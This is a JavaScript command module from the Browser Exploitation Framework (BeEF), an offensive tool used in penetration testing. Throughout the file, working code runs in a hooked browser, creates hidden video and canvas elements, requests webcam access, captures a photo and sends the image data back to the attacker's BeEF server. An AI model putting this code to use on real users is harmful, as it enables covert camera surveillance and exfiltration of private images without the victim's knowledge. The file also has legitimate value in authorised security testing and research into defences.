//
// Copyright (c) 2006-2023Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//



beef.execute(function() {
    if (beef.browser.hasWebGL()) {
        beef.debug('[Webcam HTML5] Browser supports WebGL');
    } else {
        beef.debug('[Webcam HTML5] Error: WebGL is not supported');
        beef.net.send("<%= @command_url %>",<%= @command_id %>, 'result=WebGL is not supported', beef.are.status_error());
        return;
    }

    var vid_id = beef.dom.generateID();
    var can_id = beef.dom.generateID();
    var vid_el = beef.dom.createElement('video',{'id':vid_id,'style':'display:none;','autoplay':'true'});
    var can_el = beef.dom.createElement('canvas',{'id':can_id,'style':'display:none;','width':'640','height':'480'});
    $j('body').append(vid_el);
    $j('body').append(can_el);

    var ctx = can_el.getContext('2d');

    var localMediaStream = null;
    var streaming = false;

    var width = 320;    // We will scale the photo width to this
    var height = 0;     // This will be computed based on the input stream


    var cap = function() {
        if (localMediaStream) {
            ctx.drawImage(vid_el,0,0,width,height);
            beef.net.send("<%= @command_url %>",<%= @command_id %>, 'image='+can_el.toDataURL('image/png'));
        } else {
            beef.net.send("<%= @command_url %>",<%= @command_id %>, 'result=something went wrong', beef.are.status_error());
        }
    };

    window.URL = window.URL || window.webkitURL;

    // Older browsers might not implement mediaDevices at all, so we set an empty object first
    if (navigator.mediaDevices === undefined) {
        navigator.mediaDevices = {};
    }

    // Some browsers partially implement mediaDevices. We can't just assign an object
    // with getUserMedia as it would overwrite existing properties.
    // Here, we will just add the getUserMedia property if it's missing.
    if (navigator.mediaDevices.getUserMedia === undefined) {
        navigator.mediaDevices.getUserMedia = function(constraints) {

            // First get ahold of the legacy getUserMedia, if present
            var getUserMedia = navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;

            // Some browsers just don't implement it - return a rejected promise with an error
            // to keep a consistent interface
            if (!getUserMedia) {
                return Promise.reject(new Error('getUserMedia is not implemented in this browser'));
            }

            // Otherwise, wrap the call to the old navigator.getUserMedia with a Promise
            return new Promise(function(resolve, reject) {
                getUserMedia.call(navigator, constraints, resolve, reject);
            });
        }
    }

    navigator.mediaDevices.getUserMedia({video:true}).then(function(stream) {
        if ('srcObject' in vid_el) {
            vid_el.srcObject = stream;
            vid_el.play();
        } else {
            vid_el.src = window.URL.createObjectURL(stream);
        }
        localMediaStream = stream;
        vid_el.addEventListener('canplay', function(ev){
            if (!streaming) {
                streaming = true;
                setTimeout(cap,2000);
            }
        }, false);
    }, function(err) {
        beef.debug('[Webcam HTML5] Error: getUserMedia call failed');
        beef.net.send("<%= @command_url %>",<%= @command_id %>, 'result=getUserMedia call failed', beef.are.status_error());
    });

    // Retrieve the chosen div option from BeEF and display
    var choice = "<%= @choice %>";
    switch (choice) {
        case "320x240":
            size320(); break;
        case "640x480":
            size640(); break;
        case "Full":
            sizeFull(); break;
        default:
            size320();  break;
    }

    function size320() {
        width = 320;
        height = 240;
    }
    function size640() {
        width = 640;
        height = 480;
    }
    function sizeFull() {
        width = 1280;
        height = 720;
    }
});

